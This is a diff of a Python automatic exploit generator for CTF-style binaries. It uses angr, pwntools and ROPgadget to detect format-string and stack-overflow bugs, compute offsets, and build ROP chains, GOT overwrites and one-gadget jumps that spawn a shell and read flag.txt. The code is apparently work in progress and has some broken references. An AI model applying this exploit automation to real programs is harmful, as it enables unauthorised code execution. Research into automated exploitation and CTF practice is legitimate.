@@ -10,19 +10,19 @@ from binascii import *
 
 # Disable angr logging and pwntools until we need it 
 logging.getLogger("angr").setLevel(logging.CRITICAL)
+#logging.getLogger("angr").setLevel(logging.DEBUG)
 logging.getLogger("os").setLevel(logging.CRITICAL)
 logging.getLogger("pwnlib").setLevel(logging.CRITICAL)
 
 
 
 # Create a logger object
-logger = logging.getLogger("rage")
+logger = logging.getLogger("RageAgainstTheMachine")
 
 # Set the log level
-logger.setLevel(logging.DEBUG)
-
+logger.setLevel(logging.INFO)
 # Create a formatter
-formatter = logging.Formatter('%(name)s - %(levelname)s - %(message)s')
+formatter = logging.Formatter('%(name)s - [%(levelname)s]: %(message)s')
 
 # Create a console handler and set its formatter and log level
 ch = logging.StreamHandler()
@@ -35,14 +35,13 @@ logger.addHandler(ch)
 
 
 
-
 context.update(
     arch="amd64",
     endian="little",
     log_level="warning",
     os="linux",
-    terminal=["tmux", "split-window", "-h", "-p 65"]
-    #terminal=["st"]
+    #terminal=["tmux", "split-window", "-h", "-p 65"]
+    terminal=["st"]
 )
 
 # Important lists to use such as useful strings, the functions we want to call in our rop chain, the calling convention, and useful rop functions with gadgets
@@ -52,7 +51,7 @@ arg_regs = [b"rdi", b"rsi", b"rdx", b"rcx", b"r8", b"r9"]
 useful_rop_functions = ["__libc_csu_init"]
 
 
-class Raeg:
+class rAEG:
     # Initialize class variables that are important here
     def __init__(self, binary_path, libc_path):
         self.binary = binary_path
@@ -72,8 +71,8 @@ class Raeg:
         self.symbolic_padding = None
 
         self.libc_offset_string = ""
-        self.canary_offset_string = None
-        self.format_write_address = None
+        self.canary_offset_string = ""
+        self.format_string = ""
 
         self.has_leak = False
         self.has_overflow = False
@@ -85,72 +84,53 @@ class Raeg:
     # Determine which exploit we need and return which type as a string
     # Also determine the parameters needed, and the function to execute
     def find_vulnerability(self):
+        self.core_smash()
+        self.angry_analyze()
 
-        #self.angry_analyze()
-        print(self.has_leak)
-
-        # First find if it is a format string vulnerability
-        p = self.start_process()
-
-        prompt = p.recvline()
-        p.sendline(b"%p")
-        output = b""
-        try:
-            p.recvuntil(b"<<<")
-            output = p.recvline()
-        except EOFError:
-            output = b""
-        logger.info(output)
-        if b"0x" in output or b"nil" in output:
-            self.has_leak = True
-            logger.info(f"Found a format string vulnerability with {output}")
+        if self.has_leak:
+            logger.info(f"Found a format string vulnerability")
 
             symbols = []
             if "pwnme" in self.elf.sym.keys():
-                logging.getLogger("pwnlib").setLevel(logging.INFO)
-                log.info("Found a format overwrite with the pwnme variable")
-                logging.getLogger("pwnlib").setLevel(logging.CRITICAL)
-                ret = self.format_write(1337, self.elf.sym['pwnme'])
+                logger.info("Found a format overwrite with the pwnme variable")
+                self.exploit_function = "pwnme"
+                ret = self.format_write(1337, self.elf.sym['pwnme'], 'pwnme')
                 if ret == 1:
                     None
                 else:
                     for i in self.elf.got.keys():
                         try:
-                            ret = self.format_write(self.elf.sym['win'], self.elf.got[i])
+                            ret = self.format_write(self.elf.sym['win'], self.elf.got[i], 'fmtstr')
                             if ret == 1:
                                 break
                         except:
-                            log.info("Not the Correct Address...")
+                            ret = 0
             elif "win" in self.elf.sym.keys() and "pwnme" not in self.elf.sym.keys():
-                logging.getLogger("pwnlib").setLevel(logging.INFO)
-                log.info("Found a win function with a format got overwrite")
-                logging.getLogger("pwnlib").setLevel(logging.CRITICAL)
+                logger.info("Found a win function with a format got overwrite")
+
+                self.exploit_function = "win"
                 for i in self.elf.got.keys():
                     try:
-                        ret = self.format_write(self.elf.sym['win'], self.elf.got[i])
+                        ret = self.format_write(self.elf.sym['win'], self.elf.got[i], 'fmtstr')
                         if ret == 1:
                             break
-                    except:
-                        log.info("Not the Correct Address...")
-                self.exploit_function = "win"
-            elif "fopen" in self.elf.sym.keys():
-                logging.getLogger("pwnlib").setLevel(logging.INFO)
-                log.info("Found a format read")
-                logging.getLogger("pwnlib").setLevel(logging.CRITICAL)
-                self.format_leak()
+                    except KeyError:
+                        ret = 0
             else:
-                self.angry_stack_smash()
-                self.generate_rop_chain()
-
+                self.format_leak()
+                if "fopen" in self.elf.sym.keys():
+                    logger.info("Found a format read")
+                else:
+                    logger.info("Found a libc leak")
+                    self.generate_rop_chain()
 
         else:
-            self.angry_stack_smash()
+            p = process(self.binary)
+            prompt = p.recvline()
 
-            if b"Leak" in prompt:
+            if b"0x" in prompt:
                 self.has_libc_leak = True
 
-
-            # Find important string in the binary
             for s in strings:
                 output = subprocess.check_output(["ROPgadget", "--binary", self.binary, "--string", f"{s}"])
                 string_output = output.split(b"\n")[2].split(b" ")
@@ -166,8 +146,10 @@ class Raeg:
             # Find functions to use for exploit by enumerating through one win exploit functions
             #for symb in self.elf.sym.keys:
             if "win" in self.elf.sym.keys():
-                # Either ret2win, rop parameters, or format got overwrite
                 self.exploit_function = "win"
+                goal = self.find_goal("win")
+                if goal != None:
+                    self.exploit_function = goal
                 logger.info("Found win function")
             elif "system" in self.elf.sym.keys():
                 self.exploit_function = "system"
@@ -189,15 +171,10 @@ class Raeg:
                 self.exploit_function = "puts"
                 logger.info("Found puts function")
 
-
             # Set functions and parameters as a dictionary set
 
             self.parameters = params
             self.generate_rop_chain()
-
-
-        return None
-
 
     # Function to check if there is a memory corruption which can lead to the instruction pointer being overwritten
     def check_mem_corruption(self, simgr):
@@ -214,60 +191,31 @@ class Raeg:
                         simgr.stashes["mem_corrupt"].append(path)
                     except ValueError:
                         logger.warning("Could not find index of pc overwrite")
-
-
                 simgr.stashes["unconstrained"].remove(path)
                 simgr.drop(stash="active")
 
         return simgr
 
     # Use angr to explore with the check_mem_corruption function
-    def angry_stack_smash(self):
+    def angry_analyze(self):
         # Create angr project
-        start_addr = self.elf.sym["main"]
+        self.proj = angr.Project(self.binary, load_options={"auto_load_libs":False})
+        self.cfg = self.proj.analyses.CFGFast()
+        self.fun_mgr = self.cfg.kb.functions
+
         # Maybe change to symbolic file stream
-        buff_size = 613
+        buff_size = 600
         self.symbolic_input = claripy.BVS("input", 8 * buff_size)
         self.symbolic_padding = None
 
-
         self.state = self.proj.factory.blank_state(
-                addr=start_addr,
+                addr=self.elf.sym["main"],
                 stdin=self.symbolic_input,
-                add_options = angr.options.unicorn,
+                add_options = angr.options.unicorn
         )
-        self.simgr = self.proj.factory.simgr(self.state, save_unconstrained=True)
+        self.simgr = self.proj.factory.simgr(self.state)#, save_unconstrained=True)
         self.simgr.stashes["mem_corrupt"] = []
-
-        logger.info("Attempting to smash the stack")
-        self.simgr.explore(step_func=self.check_mem_corruption)
-
-        if self.simgr.errored:
-            logger.warning(f"Simulation errored with {self.simgr.errored[0]}")
-
-        if len(self.simgr.stashes["mem_corrupt"]) <= 0:
-            logger.warning("Failed to smash stack")
-
-    def angry_analyze(self):
-
-        self.proj = angr.Project(self.binary, load_options={"auto_load_libs":False})
-        # This is the address after the last printf is called which is where we want to check the got table
-        # to see which functions are unfilled
-
-        self.cfg = self.proj.analyses.CFGFast()
-        # Maybe change to symbolic file stream
-        buff_size = 613
-        self.symbolic_input = claripy.BVS("input", 8 * buff_size)
-
-        state = self.proj.factory.entry_state(
-            addr = self.elf.sym["main"],
-            stdin = self.symbolic_input,
-            add_options = angr.options.unicorn,
-        )
-
-        self.simgr = self.proj.factory.simgr(state)
         self.simgr.stashes["format_strings"] = []
-        self.simgr.stashes["mem_corrupt"] = []
 
         # This is the address after the last printf is called which is where we want to check the got table
         # to see which functions are unfilled
@@ -279,29 +227,109 @@ class Raeg:
         def analyze_printf(state):
             # Check if rsi is not a string
             # If it isn't then we know the vulnerable printf statement
+            string = state.solver.eval(state.regs.rdi)
             varg = state.solver.eval(state.regs.rsi)
             address = state.solver.eval(state.regs.rip)
 
-            # If rsi is not an address
-            if varg <= 0xff:
-                self.last_printf_address = hex(state.callstack.current_return_target)
+            return_target = state.callstack.current_return_target
 
+            #print(return_target)
+
+            # If rdi is a stack or libc address
+            if string >= 0xffffffffff:
+                self.has_leak = True
+
+        def analyze_input(state):
+            size = state.solver.eval(state.regs.rsi)
+            if size >= 1000:
+                self.simgr.drop(stash = "active")
+
+        def debug_read(state):
+            print(f"mem_read at {state}")
+            print(f"Mem read length {state.inspect.mem_read_expr}")
+
+        #self.state.inspect.b("mem_read", when=angr.BP_AFTER, action=debug_read)
+
+        self.proj.hook_symbol("fgets", analyze_input)
         self.proj.hook_symbol("printf", analyze_printf)
 
-
-        self.simgr.run()
-        for error in self.simgr.errored:
-            print(error)
-            if error == "Symbolic (format) string, game over :(":
-               self.has_leak = True
-
-
+        logger.info("Symbolically analyzing the binary")
+        #try:
+        self.simgr.explore(step_func=self.check_mem_corruption)
+        #except ValueError:
+            #logger.warning(f"Simulation unsatisfiable")
+            #self.has_leak = True
 
 
-    def find_arguments(self, function, goal):
-        return None
+        for e in self.simgr.errored:
+            logger.warning(f"Simulation errored with {error}")
+            #print(e.error)
+            if e.error == "Symbolic (format) string, game over :(":
+                logger.info("Found symbolic format string vulnerability")
+                self.has_leak = True
 
-    
+        if len(self.simgr.stashes["mem_corrupt"]) <= 0:
+            logger.warning("Failed to smash stack")
+        else:
+            self.has_overflow = True
+
+
+    # Dynamically get the offset
+    def core_smash(self):
+        p = process(self.binary)
+        while p.poll() == None:
+            if p.can_recv(timeout=1):
+                try:
+                    p.recv()
+                except EOFError:
+                    continue
+            else:
+                p.sendline(cyclic(3000,n=8))
+                p.wait()
+                try:
+                    core = p.corefile
+                except:
+                    continue
+                p.close()
+                p.kill()
+                if core == None:
+                    continue
+                os.remove(core.file.name)
+                if(core.stack.data[-8:] != b'\x00'*8):
+                    self.core_smash()
+                    continue
+                padding = cyclic_find(core.read(core.rsp, 8),n=8)
+                if padding == -0x1:
+                    padding = cyclic_find(core.read(core.rbp, 8),n=8)
+                    if padding == -0x1:
+                        continue
+                    else:
+                        padding += 8
+        self.padding = padding
+
+
+    def find_goal(self, function_name):
+
+        arguments = []
+        function = self.fun_mgr[self.elf.sym[function_name]]
+
+        calls = function.get_call_sites()
+        goal_addr = None
+        end = None
+
+        for b in function.block_addrs:
+            end = b
+
+        for call in calls:
+            target = function.get_call_target(call)
+            if self.fun_mgr[target].name == "system":
+               goal_addr = call
+
+        if goal_addr != None:
+            return goal_addr
+        else:
+            return None
+
     # Find pop gadgets to control register
     def find_pop_reg_gadget(self, register):
         # Filters out only pop instructions 
@@ -383,9 +411,6 @@ class Raeg:
         reg2 = min_gadget.split(b"[")[1].split(b",")[1].split(b"]")[0].split(b";")[0].strip()
         return min_gadget, reg1, reg2
 
-    # Find writable address in binary
-    def find_writable_address(self):
-        return None
 
     # Write string to writable address in the binary
     # !TODO Change to be able to write different strings
@@ -462,6 +487,8 @@ class Raeg:
                             #print(arg_regs[i])
                             param = parameters[i]
                             break;
+                        if b"rax" in instruction:
+                            param = p64(59)
                     chain += param
 
         # To avoid movaps error for all chains put an extra ret to make the chain divisible by 16
@@ -480,7 +507,11 @@ class Raeg:
 
             chain += p64(syscall_gadget)
         else:
-            chain += p64(self.elf.sym[function])
+            if type(function) == int:
+                print(hex(function))
+                chain += p64(function)
+            else:
+                chain += p64(self.elf.sym[function])
         logger.info(f"Generated ROP chain for {function} with {len(parameters)} parameters")
 
         return chain
@@ -507,13 +538,12 @@ class Raeg:
 
         prompt = p.recvline()
 
+        print(hex(self.libc.sym["system"]))
 
-        if b"Leak" in prompt:
+        if b"0x" in prompt:
             self.leak = int(prompt.split(b":")[1].strip(b"\n"),16)
             logger.info(f"Libc address leaked {hex(self.leak)}")
-
             self.libc.address = self.leak + self.libc_offset
-
             logger.info(f"Found libc base address {hex(self.libc.address)}")
 
         else:
@@ -528,31 +558,40 @@ class Raeg:
 
 
         pop_rdi = p64(r.find_gadget(["pop rdi", "ret"])[0] + self.libc.address)
+        pop_rsi = p64(r.find_gadget(["pop rsi", "pop r15", "ret"])[0] + self.libc.address)
         bin_sh = p64(next(self.libc.search(b"/bin/sh\x00")))
-        logger.info(f"Found pop rdi gadget in libc {hex(u64(pop_rdi))}")
-        logger.info(f"Found /bin/sh address in libc {hex(u64(bin_sh))}")
+        #logger.info(f"Found pop rdi gadget in libc {hex(u64(pop_rdi))}")
+        #logger.info(f"Found /bin/sh address in libc {hex(u64(bin_sh))}")
 
-        #chain = self.symbolic_padding
-        # printlibc-7
-        chain = b"A" * 216
-        #chain = b"A" * 168
-        # ret2one-4
-        #chain = b"A" * 136
 
+        self.padding = 248
+        #padding_len = 152
+        #padding_len = 88
+        #padding_len = 216
+
+        if self.symbolic_padding == None:
+            if self.padding != None:
+               chain = b"A" * self.padding
+        else:
+            chain = self.symbolic_padding
 
         chain += p64(self.libc.address + 0x4f302)
         chain += p64(0) * 100
 
         #chain += pop_rdi + bin_sh
+        #chain += pop_rsi + p64(0) + p64(0)
         #chain += p64(self.elf.sym["_fini"])
         #chain += p64(self.libc.sym["system"])
+        #chain += p64(0)
 
         p.sendline(chain)
         p.sendline(b"cat flag.txt")
         try:
-            output = p.recvuntil(b"}").decode().split("\n")[-1]
-            if self.flag == None:
-                self.flag = output
+            output = p.recvall(timeout=40)
+            print(output)
+            if b"flag" in output:
+                self.flag = b"flag{" + output.split(b"{")[1].replace(b" ", b"").replace(b"\n", b"").split(b"}")[0] + b"}"
+                self.flag = self.flag.decode()
         except:
             logger.info("ROP chain exploit failed")
 
@@ -562,7 +601,6 @@ class Raeg:
 
         if self.string_address == None:
             #Perform a w16te primitive
-            print(self.has_libc_leak)
             if self.has_libc_leak == True:
                 self.rop_chain = self.rop_libc()
             else:
@@ -608,11 +646,11 @@ class Raeg:
                         self.canary_offset_string = offset_str
                         logger.info(f"Found canary leak at offset {i}:{address}")
 
-                    libc_leak = re.search(r"0x7f[^f][a-f0-9]+", address)
+                    libc_leak = re.search(r"0x7f[^f][a-f0-9]+34a", address)
                     if libc_leak:
                         self.libc_offset_string = offset_str.split(".")[0]
                         self.has_libc_leak = True
-                        logger.info(f"Found libc leak for libc_start_main at offset {i}:{hex(address)}")
+                        logger.info(f"Found libc leak at offset {i}:{hex(address)}")
 
                     try:
                         flag = unhexlify(response)[::-1]
@@ -642,13 +680,13 @@ class Raeg:
     #Accepts:
     #value (e.sym[] or int value to write)
     #addr (e.sym[] or e.got[] address to write to)
-    def format_write(self, value, addr):
+    def format_write(self, value, addr, exp_type):
         offset = 0
         #Find response from self.binary
         for i in range(1, 100):
             p = process(self.binary)
             probe = 'AAAAAAAZ%' + str(i) + '$p'
-            p.sendline(probe)
+            p.sendline(bytes(probe,"utf-8"))
             data = p.recvall().decode().strip('\n').split('Z')
             if data[1] == '0x5a41414141414141':
                 offset = i
@@ -656,10 +694,8 @@ class Raeg:
                 break
             p.close()
 
-        logger.info("First Controllable Offset Located at: " + str(offset))
 
         #Find Spaces written for offset
-        logger.info("Testing Which Offset to use in Format String...")
         spaces_written = 0
         test_str = '%' + str(value) + 'd%1$n'
 
@@ -687,24 +723,41 @@ class Raeg:
                     break
 
         #Convert to bytes and add vulnerable address in GOT
-        format_string = bytes(format_string, 'utf-8') + p64(addr)
-        logger.info(f"Sending Format String: {format_string}")
+        self.format_string = bytes(format_string, 'utf-8') + p64(addr)
+
 
         #Send exploit
         p = process(self.binary)
-        p.sendline(format_string)
-        p.sendline(b'cat flag.txt')
-        
-        #Tries to recv all until timeout
-        try:
-            data = p.recvall(timeout=8)
-            if 'flag' in data.decode():
-                print(data)
-                p.close()
-                return 1
-        except:
-            log.warning("Receive Failed...")
-            return 0 
+        p.sendline(self.format_string)
+
+        if exp_type == 'pwnme':
+            try:
+                data = p.recvall(timeout=8)
+                if b"flag" in data:
+                    self.flag = b"flag{" + data.split(b"{")[1].replace(b" ", b"").replace(b"\n", b"").split(b"}")[0] + b"}"
+                    self.flag = self.flag.decode()
+                    p.close()
+                    logger.info("First Controllable Offset Located at: " + str(offset))
+                    logger.info(f"Sending Format String: {self.format_string}")
+                    return 1
+            except:
+                return 0
+
+        else:
+            p.sendline(b'cat flag.txt')
+            #Tries to recv all until timeout
+            try:
+                data = p.recvall(timeout=8)
+                if b'flag' in data:
+                    self.flag = b"flag{" + data.replace(b" ", b"").replace(b"\n", b"").split(b"{")[1].split(b"}")[0] + b"}"
+                    self.flag = self.flag.decode()
+                    p.close()
+                    logger.info("First Controllable Offset Located at: " + str(offset))
+                    logger.info(f"Sending Format String: {self.format_string}")
+                    return 1
+            except:
+                log.warning("Receive Failed...")
+                return 0
 
 
 
@@ -743,33 +796,32 @@ class Raeg:
             if "Leak" in line:
                debug_output = line
 
-
         for line in debug_lines:
             if "Leak" in line:
                 debug_output = line
 
+
+        #print(f"Leak: {debug_output}")
+        #print(f"Base: {libc_base_debug}")
+
+
         debug_ouput = debug_output.split("Leak")
 
-
-
-        leak_address = re.findall(r"0x7f[A-Fa-f0-9]+", debug_output)[0]
+        leak_address = re.findall(r" 0x7f[A-Fa-f0-9]+", debug_output)
+        #print("\n\n")
+        #print(f"Leak: {leak_address}")
+        leak_address = leak_address[-1]
         libc_base_address = re.search(r"0x[0]+7f[A-Fa-f0-9]+", libc_base_debug)
 
         leak_address = int(leak_address, 16)
+        #print(f"Base: {libc_base_address}")
+
         if libc_base_address:
             libc_base_address = int(libc_base_address.group(),16)
 
-
-
-
         self.libc_offset = libc_base_address - leak_address
 
-        #print("Cleaning disgusting r2 shit off of screen")
-        #os.system("clear")
         logger.info(f"Found libc offset {self.libc_offset}")
-
-
-        return None
 
 
     def start_process(self):
@@ -777,9 +829,10 @@ class Raeg:
         gs = """
             init-pwndbg
         """
-
-        #return gdb.debug(self.binary, gdbscript=gs)
-        return process(self.binary)
+        if args.GDB:
+            return gdb.debug(self.binary, gdbscript=gs)
+        else:
+            return process(self.binary)
 
     
     def exploit(self):
@@ -787,18 +840,14 @@ class Raeg:
 
 
         if self.symbolic_padding != None:
-            # Check if regular rop chain or libc leak
-            # If there is a leak given then parse the leak
-            #
-            #chain = self.generate_rop_chain_call()
             if self.rop_chain != None:
                 logger.info("Sending ROP Chain")
                 p.sendline(self.symbolic_padding + self.rop_chain)
                 p.sendline(b"cat flag.txt")
+                p.sendline(b"cat flag.txt")
                 try:
-                    output = p.recvuntil(b"}").decode().split("\n")[-1]
-                    if self.flag == None:
-                        self.flag = output
+                    output = p.recvall(timeout=1).decode()
+                    self.flag = "flag{" + output.split("{")[1].split("}")[0] + "}"
                     print(self.flag)
                 except:
                     logger.info("ROP chain exploit failed")
@@ -808,37 +857,39 @@ class Raeg:
             # Insert leak stack function here
             if self.flag != None:
                 print(self.flag)
-            else:
-                if self.exploit_function == "pwnme":
-                    self.format_write(209, self.elf.sym["pwnme"])
+
+
+
+
 
 
 
 if __name__ == "__main__":
+
+    print("""
+ ██▀███   ▄▄▄        ▄████ ▓█████
+▓██ ▒ ██▒▒████▄     ██▒ ▀█▒▓█   ▀
+▓██ ░▄█ ▒▒██  ▀█▄  ▒██░▄▄▄░▒███
+▒██▀▀█▄  ░██▄▄▄▄██ ░▓█  ██▓▒▓█  ▄
+░██▓ ▒██▒ ▓█   ▓██▒░▒▓███▀▒░▒████▒
+░ ▒▓ ░▒▓░ ▒▒   ▓▒█░ ░▒   ▒ ░░ ▒░ ░
+  ░▒ ░ ▒░  ▒   ▒▒ ░  ░   ░  ░ ░  ░
+  ░░   ░   ░   ▒   ░ ░   ░    ░
+   ░           ░  ░      ░    ░  ░
+    """)
+
 
     parser = argparse.ArgumentParser(
         prog = "RageAgainstTheMachine",
         description = "An automatic exploit generator using angr, ROPgadget, and pwntools",
         epilog = "Created by Stephen Brustowicz, Alex Schmith, Chandler Hake, and Matthew Brown"
     )
-    parser.add_argument("bin", help="path of the binary to exploit")
-    #parser.add_argument("libc", help="path of libc shared object")
-    args = parser.parse_args()
-    rage = Raeg(args.bin, "/opt/libc.so.6")
-    #rage = Raeg(args.bin, "/usr/lib/libc.so.6")
 
-    ascii_art = """
-     ██▀███   ▄▄▄        ▄████ ▓█████ 
-    ▓██ ▒ ██▒▒████▄     ██▒ ▀█▒▓█   ▀ 
-    ▓██ ░▄█ ▒▒██  ▀█▄  ▒██░▄▄▄░▒███   
-    ▒██▀▀█▄  ░██▄▄▄▄██ ░▓█  ██▓▒▓█  ▄ 
-    ░██▓ ▒██▒ ▓█   ▓██▒░▒▓███▀▒░▒████▒
-    ░ ▒▓ ░▒▓░ ▒▒   ▓▒█░ ░▒   ▒ ░░ ▒░ ░
-      ░▒ ░ ▒░  ▒   ▒▒ ░  ░   ░  ░ ░  ░
-      ░░   ░   ░   ▒   ░ ░   ░    ░   
-       ░           ░  ░      ░    ░  ░
-                                      """
-    print(ascii_art)
+    #parser.add_argument("bin",  help="path of the binary to exploit")
+    
+    arguments = parser.parse_args()
+    rage = rAEG(args.BIN, "/opt/libc.so.6")
+
     rage.find_vulnerability()
 
     rage.exploit()
